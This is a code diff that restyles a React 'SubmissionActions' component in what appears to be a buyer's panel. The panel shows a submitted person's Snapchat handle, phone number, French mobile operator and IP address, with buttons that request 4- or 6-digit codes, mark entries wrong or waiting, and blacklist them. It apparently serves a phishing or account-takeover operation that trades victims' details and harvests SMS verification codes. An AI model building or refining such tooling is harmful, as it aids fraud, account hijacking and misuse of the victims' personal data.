@@ -1,18 +1,37 @@
 import { useState } from "react";
 import { motion } from "framer-motion";
-import { Send, Hash, Ban, Clock, X, Ghost, Phone, MapPin, Globe } from "lucide-react";
+import { Send, Hash, Ban, Clock, X, Copy, Check } from "lucide-react";
 import { base44 } from "@/api/base44Client";
 import { t } from "@/components/buyer/i18n";
 
-const opPill = {
-  SFR: "bg-red-500/15 text-red-400 border border-red-500/30",
-  Bouygues: "bg-blue-500/15 text-blue-400 border border-blue-500/30",
-  Orange: "bg-orange-400/15 text-orange-400 border border-orange-400/30",
-};
-
 function formatFull(tel) {
   const d = String(tel || "").replace(/\D/g, "");
-  return d.match(/.{1,2}/g)?.join(" ") || d;
+  return "+" + d;
+}
+
+function CopyField({ label, value, bg }) {
+  const [copied, setCopied] = useState(false);
+  const copy = async () => {
+    try {
+      await navigator.clipboard.writeText(String(value));
+      setCopied(true);
+      setTimeout(() => setCopied(false), 1200);
+    } catch {}
+  };
+  return (
+    <div className="rounded-xl px-3 py-2.5 flex items-center justify-between gap-3" style={{ backgroundColor: bg }}>
+      <div className="min-w-0">
+        <div className="text-[10px] font-bold uppercase tracking-wider text-slate-500">{label}</div>
+        <div className="text-sm font-semibold text-slate-900 truncate">{value}</div>
+      </div>
+      <button
+        onClick={copy}
+        className="shrink-0 px-2.5 py-1 rounded-lg bg-white border border-slate-300 text-[11px] font-bold text-slate-700 hover:bg-slate-50 transition-colors flex items-center gap-1"
+      >
+        {copied ? <><Check className="w-3 h-3" /> Copied</> : <><Copy className="w-3 h-3" /> Copy</>}
+      </button>
+    </div>
+  );
 }
 
 export default function SubmissionActions({ sub, discord, lang, buyerId, onDone }) {
@@ -57,50 +76,48 @@ export default function SubmissionActions({ sub, discord, lang, buyerId, onDone 
   };
 
   const actions = [
-    { key: "code_ready", label: t(lang, "code4"), icon: Send, cls: "bg-primary text-primary-foreground" },
-    { key: "code6", label: t(lang, "code6"), icon: Hash, cls: "bg-purple-500 text-white" },
-    { key: "code6sfr", label: t(lang, "code6sfr"), icon: Hash, cls: "bg-red-500 text-white" },
-    { key: "code6orange", label: t(lang, "code6orange"), icon: Hash, cls: "bg-orange-500 text-white" },
-    { key: "wrong", label: t(lang, "wrong"), icon: X, cls: "bg-red-500/15 text-red-400 border border-red-500/30" },
-    { key: "wait", label: t(lang, "wait"), icon: Clock, cls: "bg-blue-500/15 text-blue-400 border border-blue-500/30" },
+    { key: "code_ready", label: t(lang, "code4"), icon: Send, style: { backgroundColor: "#00a86b", color: "#fff" } },
+    { key: "code6", label: t(lang, "code6"), icon: Hash, style: { backgroundColor: "#9b59b6", color: "#fff" } },
+    { key: "code6sfr", label: t(lang, "code6sfr"), icon: Hash, style: { backgroundColor: "#e74c3c", color: "#fff" } },
+    { key: "code6orange", label: t(lang, "code6orange"), icon: Hash, style: { backgroundColor: "#ff6600", color: "#fff" } },
+    { key: "wrong", label: t(lang, "wrong"), icon: X, style: { backgroundColor: "#f39c12", color: "#fff" } },
+    { key: "wait", label: t(lang, "wait"), icon: Clock, style: { backgroundColor: "#3498db", color: "#fff" } },
   ];
+
+  const opBg = {
+    SFR: "#fdecea",
+    Bouygues: "#e3f2fd",
+    Orange: "#fff3e0",
+  };
 
   return (
     <motion.div
       initial={{ opacity: 0, y: 10 }}
       animate={{ opacity: 1, y: 0 }}
-      className="bg-card border border-border rounded-2xl p-5 shadow-xl shadow-black/40"
+      className="bg-white rounded-2xl p-5 shadow-xl shadow-black/20 border border-slate-200"
     >
-      <div className="flex flex-wrap items-center gap-2 mb-4">
-        <span className={`px-2.5 py-1 rounded-md text-[11px] font-semibold ${opPill[sub.operateur] || opPill.Bouygues}`}>
-          {sub.operateur}
-        </span>
-        <span className="px-2.5 py-1 rounded-md text-[11px] font-semibold bg-primary/15 text-primary border border-primary/30">
+      <div className="flex items-center justify-between mb-4">
+        <span className="px-2.5 py-1 rounded-md text-[11px] font-bold text-slate-700" style={{ backgroundColor: "#f5f5f5" }}>
           {t(lang, "lockedByYou")}
         </span>
+        <span
+          className="px-2.5 py-1 rounded-full text-[11px] font-bold"
+          style={{ backgroundColor: opBg[sub.operateur] || opBg.Bouygues, color: "#1565c0" }}
+        >
+          {sub.operateur}
+        </span>
       </div>
 
-      <div className="space-y-2 mb-4">
-        <div className="flex items-center gap-2">
-          <Ghost className="w-4 h-4 text-muted-foreground" />
-          <span className="text-base font-bold text-foreground">@{sub.snapchat}</span>
-        </div>
-        <div className="flex items-center gap-2">
-          <Phone className="w-4 h-4 text-muted-foreground" />
-          <span className="text-base font-mono text-foreground">{formatFull(sub.telephone)}</span>
-        </div>
-      </div>
-
-      <div className="flex flex-wrap gap-x-4 gap-y-1 text-xs text-muted-foreground mb-4">
+      <div className="space-y-2.5 mb-4">
+        <CopyField label={lang === "fr" ? "Pseudo Snapchat" : "Snapchat user"} value={`@${sub.snapchat}`} bg="#f5f5f5" />
+        <CopyField label={lang === "fr" ? "Numéro de téléphone" : "Phone number"} value={formatFull(sub.telephone)} bg="#e8f5e9" />
+        <CopyField label={lang === "fr" ? "Opérateur" : "Operator"} value={sub.operateur} bg="#e3f2fd" />
         {sub.ip_address && (
-          <span className="flex items-center gap-1"><MapPin className="w-3 h-3" />{sub.ip_address}</span>
-        )}
-        {sub.country && sub.country !== "Inconnue" && (
-          <span className="flex items-center gap-1"><Globe className="w-3 h-3" />{sub.country}</span>
+          <CopyField label="IP" value={sub.ip_address} bg="#f3e5f5" />
         )}
       </div>
 
-      <div className="grid grid-cols-2 gap-2">
+      <div className="grid grid-cols-2 gap-2.5">
         {actions.map((a) => {
           const Icon = a.icon;
           return (
@@ -108,7 +125,8 @@ export default function SubmissionActions({ sub, discord, lang, buyerId, onDone 
               key={a.key}
               onClick={() => runAction(a.key)}
               disabled={!!busy}
-              className={`flex items-center gap-2 px-3 py-2.5 rounded-xl text-xs font-bold hover:opacity-90 transition-opacity disabled:opacity-50 ${a.cls}`}
+              className="flex items-center justify-center gap-2 px-3 py-3 rounded-xl text-xs font-bold hover:opacity-90 transition-opacity disabled:opacity-50"
+              style={a.style}
             >
               {busy === a.key ? (
                 <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
@@ -119,20 +137,21 @@ export default function SubmissionActions({ sub, discord, lang, buyerId, onDone 
             </button>
           );
         })}
-        <button
-          onClick={runBlacklist}
-          disabled={!!busy}
-          className="col-span-2 flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl text-xs font-bold bg-destructive/20 text-red-300 border border-destructive/40 transition-colors disabled:opacity-50"
-        >
-          {busy === "blacklist" ? (
-            <span className="w-3.5 h-3.5 border-2 border-white/40 border-t-white rounded-full animate-spin" />
-          ) : (
-            <Ban className="w-3.5 h-3.5" />
-          )}
-          {t(lang, "blacklist")}
-        </button>
       </div>
-      {result && <p className="text-center text-xs text-muted-foreground mt-3">{result}</p>}
+      <button
+        onClick={runBlacklist}
+        disabled={!!busy}
+        className="w-full mt-2.5 flex items-center justify-center gap-2 px-3 py-3 rounded-xl text-xs font-bold bg-transparent transition-colors disabled:opacity-50"
+        style={{ border: "1.5px solid #e74c3c", color: "#e74c3c" }}
+      >
+        {busy === "blacklist" ? (
+          <span className="w-3.5 h-3.5 border-2 border-red-300 border-t-red-500 rounded-full animate-spin" />
+        ) : (
+          <Ban className="w-3.5 h-3.5" />
+        )}
+        {t(lang, "blacklist")}
+      </button>
+      {result && <p className="text-center text-xs text-slate-500 mt-3">{result}</p>}
     </motion.div>
   );
 }
